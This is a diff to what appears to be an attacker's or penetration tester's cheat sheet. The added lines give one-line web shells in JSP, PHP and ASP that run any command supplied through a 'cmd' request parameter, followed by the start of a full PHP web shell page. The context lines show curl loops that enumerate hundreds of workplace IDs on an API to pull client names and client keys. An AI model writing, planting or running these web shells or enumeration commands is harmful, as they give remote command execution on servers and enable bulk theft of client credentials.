@@ -135,6 +135,13 @@ cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerU
 cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
 
 [*] Web Shell
++---------- One Liners ----------+
+JSP   <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+PHP   <?php echo passthru($_GET['cmd']); ?>
+      <?php echo shell_exec($_GET['cmd']); ?>
+ASP   <% eval request("cmd") %>
+
++---------- PHP ----------+
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
